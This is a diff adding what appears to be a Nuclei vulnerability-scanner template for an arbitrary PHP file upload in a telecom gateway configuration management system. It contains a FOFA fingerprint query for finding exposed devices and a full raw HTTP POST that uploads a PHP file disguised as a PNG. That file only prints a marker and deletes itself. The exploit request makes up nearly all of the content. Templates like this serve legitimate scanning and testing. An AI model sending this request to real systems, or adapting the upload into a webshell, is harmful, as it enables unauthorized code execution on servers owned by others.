@@ -1,0 +1,143 @@
+id: poc-pmogztonaiwxio4h
+info:
+  name: 电信网关配置管理系统 文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pmogztonaiwxio4h'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pmogztonaiwxio4h
+    fofa: body="img/dl.gif" && title="系统登录"
+http:
+- raw:
+  - 'POST /manager/teletext/material/upload.php HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en;q=0.6
+
+
+    Cookie: PHPSESSID=vsdl33qjn3fbslu7k3r99di5n3
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+
+
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+
+    Content-Disposition: form-data; name="fileToUpload"; filename="dudesuite.php"
+
+
+    Content-Type: image/png
+
+
+
+
+    <?php echo "DudeSuite";unlink(__FILE__); ?>
+
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+
+    Content-Disposition: form-data; name="type"
+
+
+
+
+    img
+
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+
+    Content-Disposition: form-data; name="w"
+
+
+
+
+    1280
+
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+
+    Content-Disposition: form-data; name="h"
+
+
+
+
+    720
+
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+
+    Content-Disposition: form-data; name="userid"
+
+
+
+
+    1000398
+
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+
+    Content-Disposition: form-data; name="appid"
+
+
+
+
+    5
+
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+
+    Content-Disposition: form-data; name="uploadtime"
+
+
+
+
+    20230603_231117_1685805077294
+
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?success)(?=.*?php).*?$
+
+
+    # 上传文件定位
+
+    /dudesuite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
